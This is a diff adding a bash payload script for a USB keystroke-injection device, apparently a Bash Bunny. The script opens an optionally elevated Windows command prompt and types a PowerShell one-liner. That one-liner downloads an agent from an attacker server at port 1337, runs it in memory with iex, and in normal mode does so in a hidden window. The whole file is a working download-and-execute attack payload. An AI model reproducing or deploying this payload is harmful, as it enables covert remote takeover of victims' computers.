@@ -1,0 +1,30 @@
+#!/bin/bash
+# Initial duck commands to get prompt.
+if [ -z $Q_DELAY1 ]; then
+	export Q_DELAY1=8000
+fi
+if [ -z $Q_DELAY2 ]; then
+	export Q_DELAY2=8000
+fi
+
+LED ATTACK
+if [ $GETADMIN -eq 1 ]; then
+	RUN WIN powershell -C "start-process cmd  -verb runas"
+	Q DELAY $Q_DELAY1
+	Q ALT Y
+	Q DELAY $Q_DELAY2
+	Q ENTER
+else
+	RUN WIN cmd
+	Q DELAY $Q_DELAY1
+	Q ENTER
+fi
+
+# If in debug mode then will run Powershell visible in verbose mode else it will be hidden.
+if [ $DEBUG -eq 1 ]; then
+    Q STRING "powershell -NonI -Nop -C \"\$p='$SERVERIP';\$ic=1;\$jr=0;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');\$jr=1;}catch{\$ic++}if(\$jr){Invoke-bbAgent \$p 1337 -verbose;exit}}else{\$ic++}sleep -s 2}\""
+    Q ENTER
+else
+    Q STRING "powershell -NonI -W Hidden -Nop -C \"\$p='$SERVERIP';\$ic=1;\$jr=0;while(\$ic -le 20){if((test-connection \$p -count 1 -quiet) -eq \$true){try{iex (new-object net.webclient).DownloadString('http://'+\$p+':1337/getAgent');\$jr=1;}catch{\$ic++}if(\$jr){Invoke-bbAgent \$p 1337;exit}}else{\$ic++}sleep -s 2}\""
+    Q ENTER
+fi
